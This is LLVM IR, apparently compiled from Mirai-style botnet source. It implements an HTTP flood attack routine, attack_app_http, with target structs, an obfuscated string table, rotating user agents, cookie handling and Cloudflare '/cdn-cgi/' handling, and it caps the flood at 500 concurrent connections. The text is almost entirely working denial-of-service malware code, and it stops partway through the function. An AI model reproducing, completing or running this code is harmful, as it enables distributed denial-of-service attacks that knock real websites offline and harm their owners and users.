; ModuleID = 'llvm-link'
source_filename = "llvm-link"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.table_value = type { i8*, i16 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.attack_http_state = type { i32, i8, i32, i32, i32, [512 x i8], [257 x i8], [129 x i8], [513 x i8], [9 x i8], [9 x i8], i32, i32, i32, i32, i32, [5 x [128 x i8]], i32, [1024 x i8] }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.attack_cfnull_state = type { i32, i8, i32, i32, i32, [512 x i8], [129 x i8], i32 }

@.str = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.3 = private unnamed_addr constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"\0D\0AHost: \00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"Cookie: \00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"; \00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [2 x i8] c";\00", align 1
@.str.10 = private unnamed_addr constant [5 x i8] c"http\00", align 1
@.str.11 = private unnamed_addr constant [5 x i8] c"url=\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"POST\00", align 1
@.str.13 = private unnamed_addr constant [2 x i8] c"'\00", align 1
@.str.14 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@.str.15 = private unnamed_addr constant [15 x i8] c"POST /cdn-cgi/\00", align 1
@.str.16 = private unnamed_addr constant [4 x i8] c"0\0D\0A\00", align 1
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@__const.rand_alphastr.alphaset = private unnamed_addr constant [33 x i8] c"abcdefghijklmnopqrstuvw012345678\00", align 16
@table_key = dso_local global i32 -559038737, align 4
@table = dso_local global [126 x %struct.table_value] zeroinitializer, align 16
@LOCAL_ADDR = dso_local global i32 0, align 4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_app_proxy(i8 noundef zeroext %0, %struct.attack_target* noundef %1, i8 noundef zeroext %2, %struct.attack_option* noundef %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_app_http(i8 noundef zeroext %0, %struct.attack_target* noundef %1, i8 noundef zeroext %2, %struct.attack_option* noundef %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.attack_http_state*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i16, align 2
  %20 = alloca [10241 x i8], align 16
  %21 = alloca %struct.fd_set, align 8
  %22 = alloca %struct.fd_set, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.timeval, align 8
  %26 = alloca %struct.attack_http_state*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca %struct.fd_set*, align 8
  %30 = alloca i32, align 4
  %31 = alloca %struct.fd_set*, align 8
  %32 = alloca %struct.sockaddr_in, align 4
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %34 = alloca [10240 x i8], align 16
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca i8*, align 8
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca i8*, align 8
  %44 = alloca i32, align 4
  %45 = alloca i32, align 4
  %46 = alloca i8*, align 8
  %47 = alloca i32, align 4
  %48 = alloca i32, align 4
  %49 = alloca i8*, align 8
  %50 = alloca i32, align 4
  %51 = alloca i32, align 4
  %52 = alloca i32, align 4
  %53 = alloca i32, align 4
  %54 = alloca i8*, align 8
  %55 = alloca i32, align 4
  %56 = alloca i32, align 4
  %57 = alloca i8*, align 8
  %58 = alloca i32, align 4
  %59 = alloca i32, align 4
  %60 = alloca i32, align 4
  %61 = alloca i32, align 4
  %62 = alloca i32, align 4
  %63 = alloca i32, align 4
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  store i32 0, i32* %12, align 4
  store %struct.attack_http_state* null, %struct.attack_http_state** %13, align 8
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i8* @attack_get_opt_str(i8 noundef zeroext %64, %struct.attack_option* noundef %65, i8 noundef zeroext 21, i8* noundef null)
  store i8* %66, i8** %14, align 8
  %67 = load i8, i8* %7, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %69 = call i8* @attack_get_opt_str(i8 noundef zeroext %67, %struct.attack_option* noundef %68, i8 noundef zeroext 20, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0))
  store i8* %69, i8** %15, align 8
  %70 = load i8, i8* %7, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %72 = call i8* @attack_get_opt_str(i8 noundef zeroext %70, %struct.attack_option* noundef %71, i8 noundef zeroext 8, i8* noundef null)
  store i8* %72, i8** %16, align 8
  %73 = load i8, i8* %7, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %75 = call i8* @attack_get_opt_str(i8 noundef zeroext %73, %struct.attack_option* noundef %74, i8 noundef zeroext 22, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  store i8* %75, i8** %17, align 8
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 noundef zeroext %76, %struct.attack_option* noundef %77, i8 noundef zeroext 24, i32 noundef 1)
  store i32 %78, i32* %18, align 4
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 noundef zeroext %79, %struct.attack_option* noundef %80, i8 noundef zeroext 7, i32 noundef 80)
  %82 = trunc i32 %81 to i16
  store i16 %82, i16* %19, align 2
  %83 = bitcast [10241 x i8]* %20 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %83, i8 0, i64 10241, i1 false)
  %84 = load i8*, i8** %16, align 8
  %85 = icmp eq i8* %84, null
  br i1 %85, label %89, label %86

86:                                               ; preds = %4
  %87 = load i8*, i8** %17, align 8
  %88 = icmp eq i8* %87, null
  br i1 %88, label %89, label %90

89:                                               ; preds = %86, %4
  br label %2547

90:                                               ; preds = %86
  %91 = load i8*, i8** %17, align 8
  %92 = call i32 @util_strlen(i8* noundef %91)
  %93 = icmp sgt i32 %92, 255
  br i1 %93, label %94, label %95

94:                                               ; preds = %90
  br label %2547

95:                                               ; preds = %90
  %96 = load i8*, i8** %16, align 8
  %97 = call i32 @util_strlen(i8* noundef %96)
  %98 = icmp sgt i32 %97, 127
  br i1 %98, label %99, label %100

99:                                               ; preds = %95
  br label %2547

100:                                              ; preds = %95
  %101 = load i8*, i8** %15, align 8
  %102 = call i32 @util_strlen(i8* noundef %101)
  %103 = icmp sgt i32 %102, 9
  br i1 %103, label %104, label %105

104:                                              ; preds = %100
  br label %2547

105:                                              ; preds = %100
  store i32 0, i32* %10, align 4
  br label %106

106:                                              ; preds = %137, %105
  %107 = load i32, i32* %10, align 4
  %108 = load i8*, i8** %15, align 8
  %109 = call i32 @util_strlen(i8* noundef %108)
  %110 = icmp slt i32 %107, %109
  br i1 %110, label %111, label %140

111:                                              ; preds = %106
  %112 = load i8*, i8** %15, align 8
  %113 = load i32, i32* %10, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i8, i8* %112, i64 %114
  %116 = load i8, i8* %115, align 1
  %117 = sext i8 %116 to i32
  %118 = icmp sge i32 %117, 97
  br i1 %118, label %119, label %136

119:                                              ; preds = %111
  %120 = load i8*, i8** %15, align 8
  %121 = load i32, i32* %10, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i8, i8* %120, i64 %122
  %124 = load i8, i8* %123, align 1
  %125 = sext i8 %124 to i32
  %126 = icmp sle i32 %125, 122
  br i1 %126, label %127, label %136

127:                                              ; preds = %119
  %128 = load i8*, i8** %15, align 8
  %129 = load i32, i32* %10, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds i8, i8* %128, i64 %130
  %132 = load i8, i8* %131, align 1
  %133 = sext i8 %132 to i32
  %134 = sub nsw i32 %133, 32
  %135 = trunc i32 %134 to i8
  store i8 %135, i8* %131, align 1
  br label %136

136:                                              ; preds = %127, %119, %111
  br label %137

137:                                              ; preds = %136
  %138 = load i32, i32* %10, align 4
  %139 = add nsw i32 %138, 1
  store i32 %139, i32* %10, align 4
  br label %106, !llvm.loop !6

140:                                              ; preds = %106
  %141 = load i32, i32* %18, align 4
  %142 = icmp sgt i32 %141, 500
  br i1 %142, label %143, label %144

143:                                              ; preds = %140
  store i32 500, i32* %18, align 4
  br label %144

144:                                              ; preds = %143, %140
  call void @table_unlock_val(i8 noundef zeroext 61)
  call void @table_unlock_val(i8 noundef zeroext 62)
  call void @table_unlock_val(i8 noundef zeroext 63)
  call void @table_unlock_val(i8 noundef zeroext 64)
  call void @table_unlock_val(i8 noundef zeroext 65)
  call void @table_unlock_val(i8 noundef zeroext 66)
  call void @table_unlock_val(i8 noundef zeroext 67)
  call void @table_unlock_val(i8 noundef zeroext 68)
  call void @table_unlock_val(i8 noundef zeroext 69)
  call void @table_unlock_val(i8 noundef zeroext 70)
  call void @table_unlock_val(i8 noundef zeroext 71)
  %145 = load i32, i32* %18, align 4
  %146 = sext i32 %145 to i64
  %147 = call noalias i8* @calloc(i64 noundef %146, i64 noundef 3140) #6
  %148 = bitcast i8* %147 to %struct.attack_http_state*
  store %struct.attack_http_state* %148, %struct.attack_http_state** %13, align 8
  store i32 0, i32* %9, align 4
  br label %149

149:                                              ; preds = %436, %144
  %150 = load i32, i32* %9, align 4
  %151 = load i32, i32* %18, align 4
  %152 = icmp slt i32 %150, %151
  br i1 %152, label %153, label %439

153:                                              ; preds = %149
  %154 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %155 = load i32, i32* %9, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %154, i64 %156
  %158 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %157, i32 0, i32 1
  store i8 0, i8* %158, align 4
  %159 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %160 = load i32, i32* %9, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %159, i64 %161
  %163 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %162, i32 0, i32 0
  store i32 -1, i32* %163, align 4
  %164 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %165 = load i32, i32* %9, align 4
  %166 = load i8, i8* %5, align 1
  %167 = zext i8 %166 to i32
  %168 = srem i32 %165, %167
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %164, i64 %169
  %171 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %170, i32 0, i32 1
  %172 = load i32, i32* %171, align 4
  %173 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %174 = load i32, i32* %9, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %173, i64 %175
  %177 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %176, i32 0, i32 4
  store i32 %172, i32* %177, align 4
  %178 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %179 = load i32, i32* %9, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %178, i64 %180
  %182 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %181, i32 0, i32 6
  %183 = getelementptr inbounds [257 x i8], [257 x i8]* %182, i64 0, i64 0
  %184 = load i8*, i8** %17, align 8
  %185 = call i32 @util_strcpy(i8* noundef %183, i8* noundef %184)
  %186 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %187 = load i32, i32* %9, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %186, i64 %188
  %190 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %189, i32 0, i32 6
  %191 = getelementptr inbounds [257 x i8], [257 x i8]* %190, i64 0, i64 0
  %192 = load i8, i8* %191, align 4
  %193 = sext i8 %192 to i32
  %194 = icmp ne i32 %193, 47
  br i1 %194, label %195, label %223

195:                                              ; preds = %153
  %196 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %197 = load i32, i32* %9, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %196, i64 %198
  %200 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %199, i32 0, i32 6
  %201 = getelementptr inbounds [257 x i8], [257 x i8]* %200, i64 0, i64 0
  %202 = getelementptr inbounds i8, i8* %201, i64 1
  %203 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %204 = load i32, i32* %9, align 4
  %205 = sext i32 %204 to i64
  %206 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %203, i64 %205
  %207 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %206, i32 0, i32 6
  %208 = getelementptr inbounds [257 x i8], [257 x i8]* %207, i64 0, i64 0
  %209 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %210 = load i32, i32* %9, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %209, i64 %211
  %213 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %212, i32 0, i32 6
  %214 = getelementptr inbounds [257 x i8], [257 x i8]* %213, i64 0, i64 0
  %215 = call i32 @util_strlen(i8* noundef %214)
  %216 = sext i32 %215 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* align 1 %202, i8* align 4 %208, i64 %216, i1 false)
  %217 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %218 = load i32, i32* %9, align 4
  %219 = sext i32 %218 to i64
  %220 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %217, i64 %219
  %221 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %220, i32 0, i32 6
  %222 = getelementptr inbounds [257 x i8], [257 x i8]* %221, i64 0, i64 0
  store i8 47, i8* %222, align 4
  br label %223

223:                                              ; preds = %195, %153
  %224 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %225 = load i32, i32* %9, align 4
  %226 = sext i32 %225 to i64
  %227 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %224, i64 %226
  %228 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %227, i32 0, i32 10
  %229 = getelementptr inbounds [9 x i8], [9 x i8]* %228, i64 0, i64 0
  %230 = load i8*, i8** %15, align 8
  %231 = call i32 @util_strcpy(i8* noundef %229, i8* noundef %230)
  %232 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %233 = load i32, i32* %9, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %232, i64 %234
  %236 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %235, i32 0, i32 9
  %237 = getelementptr inbounds [9 x i8], [9 x i8]* %236, i64 0, i64 0
  %238 = load i8*, i8** %15, align 8
  %239 = call i32 @util_strcpy(i8* noundef %237, i8* noundef %238)
  %240 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %241 = load i32, i32* %9, align 4
  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %240, i64 %242
  %244 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %243, i32 0, i32 7
  %245 = getelementptr inbounds [129 x i8], [129 x i8]* %244, i64 0, i64 0
  %246 = load i8*, i8** %16, align 8
  %247 = call i32 @util_strcpy(i8* noundef %245, i8* noundef %246)
  %248 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %249 = load i32, i32* %9, align 4
  %250 = load i8, i8* %5, align 1
  %251 = zext i8 %250 to i32
  %252 = srem i32 %249, %251
  %253 = sext i32 %252 to i64
  %254 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %248, i64 %253
  %255 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %254, i32 0, i32 2
  %256 = load i8, i8* %255, align 4
  %257 = zext i8 %256 to i32
  %258 = icmp slt i32 %257, 32
  br i1 %258, label %259, label %289

259:                                              ; preds = %223
  %260 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %261 = load i32, i32* %9, align 4
  %262 = load i8, i8* %5, align 1
  %263 = zext i8 %262 to i32
  %264 = srem i32 %261, %263
  %265 = sext i32 %264 to i64
  %266 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %260, i64 %265
  %267 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %266, i32 0, i32 1
  %268 = load i32, i32* %267, align 4
  %269 = call i32 @ntohl(i32 noundef %268) #7
  %270 = call i32 @rand_next()
  %271 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %272 = load i32, i32* %9, align 4
  %273 = load i8, i8* %5, align 1
  %274 = zext i8 %273 to i32
  %275 = srem i32 %272, %274
  %276 = sext i32 %275 to i64
  %277 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %271, i64 %276
  %278 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %277, i32 0, i32 2
  %279 = load i8, i8* %278, align 4
  %280 = zext i8 %279 to i32
  %281 = lshr i32 %270, %280
  %282 = add i32 %269, %281
  %283 = call i32 @htonl(i32 noundef %282) #7
  %284 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %285 = load i32, i32* %9, align 4
  %286 = sext i32 %285 to i64
  %287 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %284, i64 %286
  %288 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %287, i32 0, i32 4
  store i32 %283, i32* %288, align 4
  br label %289

289:                                              ; preds = %259, %223
  %290 = call i32 @rand_next()
  %291 = urem i32 %290, 15
  switch i32 %291, label %427 [
    i32 0, label %292
    i32 1, label %301
    i32 2, label %310
    i32 3, label %319
    i32 4, label %328
    i32 5, label %337
    i32 6, label %346
    i32 7, label %355
    i32 8, label %364
    i32 9, label %373
    i32 10, label %382
    i32 11, label %391
    i32 12, label %400
    i32 13, label %409
    i32 14, label %418
  ]

292:                                              ; preds = %289
  call void @table_unlock_val(i8 noundef zeroext 72)
  %293 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %294 = load i32, i32* %9, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %293, i64 %295
  %297 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %296, i32 0, i32 5
  %298 = getelementptr inbounds [512 x i8], [512 x i8]* %297, i64 0, i64 0
  %299 = call i8* @table_retrieve_val(i32 noundef 72, i32* noundef null)
  %300 = call i32 @util_strcpy(i8* noundef %298, i8* noundef %299)
  call void @table_lock_val(i8 noundef zeroext 72)
  br label %427

301:                                              ; preds = %289
  call void @table_unlock_val(i8 noundef zeroext 73)
  %302 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %303 = load i32, i32* %9, align 4
  %304 = sext i32 %303 to i64
  %305 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %302, i64 %304
  %306 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %305, i32 0, i32 5
  %307 = getelementptr inbounds [512 x i8], [512 x i8]* %306, i64 0, i64 0
  %308 = call i8* @table_retrieve_val(i32 noundef 73, i32* noundef null)
  %309 = call i32 @util_strcpy(i8* noundef %307, i8* noundef %308)
  call void @table_lock_val(i8 noundef zeroext 73)
  br label %427

310:                                              ; preds = %289
  call void @table_unlock_val(i8 noundef zeroext 74)
  %311 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %312 = load i32, i32* %9, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %311, i64 %313
  %315 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %314, i32 0, i32 5
  %316 = getelementptr inbounds [512 x i8], [512 x i8]* %315, i64 0, i64 0
  %317 = call i8* @table_retrieve_val(i32 noundef 74, i32* noundef null)
  %318 = call i32 @util_strcpy(i8* noundef %316, i8* noundef %317)
  call void @table_lock_val(i8 noundef zeroext 74)
  br label %427

319:                                              ; preds = %289
  call void @table_unlock_val(i8 noundef zeroext 75)
  %320 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %321 = load i32, i32* %9, align 4
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %320, i64 %322
  %324 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %323, i32 0, i32 5
  %325 = getelementptr inbounds [512 x i8], [512 x i8]* %324, i64 0, i64 0
  %326 = call i8* @table_retrieve_val(i32 noundef 75, i32* noundef null)
  %327 = call i32 @util_strcpy(i8* noundef %325, i8* noundef %326)
  call void @table_lock_val(i8 noundef zeroext 75)
  br label %427

328:                                              ; preds = %289
  call void @table_unlock_val(i8 noundef zeroext 76)
  %329 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %330 = load i32, i32* %9, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %329, i64 %331
  %333 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %332, i32 0, i32 5
  %334 = getelementptr inbounds [512 x i8], [512 x i8]* %333, i64 0, i64 0
  %335 = call i8* @table_retrieve_val(i32 noundef 76, i32* noundef null)
  %336 = call i32 @util_strcpy(i8* noundef %334, i8* noundef %335)
  call void @table_lock_val(i8 noundef zeroext 76)
  br label %427

337:                                              ; preds = %289
  call void @table_unlock_val(i8 noundef zeroext 77)
  %338 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %339 = load i32, i32* %9, align 4
  %340 = sext i32 %339 to i64
  %341 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %338, i64 %340
  %342 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %341, i32 0, i32 5
  %343 = getelementptr inbounds [512 x i8], [512 x i8]* %342, i64 0, i64 0
  %344 = call i8* @table_retrieve_val(i32 noundef 77, i32* noundef null)
  %345 = call i32 @util_strcpy(i8* noundef %343, i8* noundef %344)
  call void @table_lock_val(i8 noundef zeroext 77)
  br label %427

346:                                              ; preds = %289
  call void @table_unlock_val(i8 noundef zeroext 78)
  %347 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %348 = load i32, i32* %9, align 4
  %349 = sext i32 %348 to i64
  %350 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %347, i64 %349
  %351 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %350, i32 0, i32 5
  %352 = getelementptr inbounds [512 x i8], [512 x i8]* %351, i64 0, i64 0
  %353 = call i8* @table_retrieve_val(i32 noundef 78, i32* noundef null)
  %354 = call i32 @util_strcpy(i8* noundef %352, i8* noundef %353)
  call void @table_lock_val(i8 noundef zeroext 78)
  br label %427

355:                                              ; preds = %289
  call void @table_unlock_val(i8 noundef zeroext 79)
  %356 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %357 = load i32, i32* %9, align 4
  %358 = sext i32 %357 to i64
  %359 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %356, i64 %358
  %360 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %359, i32 0, i32 5
  %361 = getelementptr inbounds [512 x i8], [512 x i8]* %360, i64 0, i64 0
  %362 = call i8* @table_retrieve_val(i32 noundef 79, i32* noundef null)
  %363 = call i32 @util_strcpy(i8* noundef %361, i8* noundef %362)
  call void @table_lock_val(i8 noundef zeroext 79)
  br label %427

364:                                              ; preds = %289
  call void @table_unlock_val(i8 noundef zeroext 80)
  %365 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %366 = load i32, i32* %9, align 4
  %367 = sext i32 %366 to i64
  %368 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %365, i64 %367
  %369 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %368, i32 0, i32 5
  %370 = getelementptr inbounds [512 x i8], [512 x i8]* %369, i64 0, i64 0
  %371 = call i8* @table_retrieve_val(i32 noundef 80, i32* noundef null)
  %372 = call i32 @util_strcpy(i8* noundef %370, i8* noundef %371)
  call void @table_lock_val(i8 noundef zeroext 80)
  br label %427

373:                                              ; preds = %289
  call void @table_unlock_val(i8 noundef zeroext 81)
  %374 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %375 = load i32, i32* %9, align 4
  %376 = sext i32 %375 to i64
  %377 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %374, i64 %376
  %378 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %377, i32 0, i32 5
  %379 = getelementptr inbounds [512 x i8], [512 x i8]* %378, i64 0, i64 0
  %380 = call i8* @table_retrieve_val(i32 noundef 81, i32* noundef null)
  %381 = call i32 @util_strcpy(i8* noundef %379, i8* noundef %380)
  call void @table_lock_val(i8 noundef zeroext 81)
  br label %427

382:                                              ; preds = %289
  call void @table_unlock_val(i8 noundef zeroext 82)
  %383 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %384 = load i32, i32* %9, align 4
  %385 = sext i32 %384 to i64
  %386 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %383, i64 %385
  %387 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %386, i32 0, i32 5
  %388 = getelementptr inbounds [512 x i8], [512 x i8]* %387, i64 0, i64 0
  %389 = call i8* @table_retrieve_val(i32 noundef 82, i32* noundef null)
  %390 = call i32 @util_strcpy(i8* noundef %388, i8* noundef %389)
  call void @table_lock_val(i8 noundef zeroext 82)
  br label %427

391:                                              ; preds = %289
  call void @table_unlock_val(i8 noundef zeroext 83)
  %392 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %393 = load i32, i32* %9, align 4
  %394 = sext i32 %393 to i64
  %395 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %392, i64 %394
  %396 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %395, i32 0, i32 5
  %397 = getelementptr inbounds [512 x i8], [512 x i8]* %396, i64 0, i64 0
  %398 = call i8* @table_retrieve_val(i32 noundef 83, i32* noundef null)
  %399 = call i32 @util_strcpy(i8* noundef %397, i8* noundef %398)
  call void @table_lock_val(i8 noundef zeroext 83)
  br label %427

400:                                              ; preds = %289
  call void @table_unlock_val(i8 noundef zeroext 84)
  %401 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %402 = load i32, i32* %9, align 4
  %403 = sext i32 %402 to i64
  %404 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %401, i64 %403
  %405 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %404, i32 0, i32 5
  %406 = getelementptr inbounds [512 x i8], [512 x i8]* %405, i64 0, i64 0
  %407 = call i8* @table_retrieve_val(i32 noundef 84, i32* noundef null)
  %408 = call i32 @util_strcpy(i8* noundef %406, i8* noundef %407)
  call void @table_lock_val(i8 noundef zeroext 84)
  br label %427

409:                                              ; preds = %289
  call void @table_unlock_val(i8 noundef zeroext 85)
  %410 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %411 = load i32, i32* %9, align 4
  %412 = sext i32 %411 to i64
  %413 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %410, i64 %412
  %414 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %413, i32 0, i32 5
  %415 = getelementptr inbounds [512 x i8], [512 x i8]* %414, i64 0, i64 0
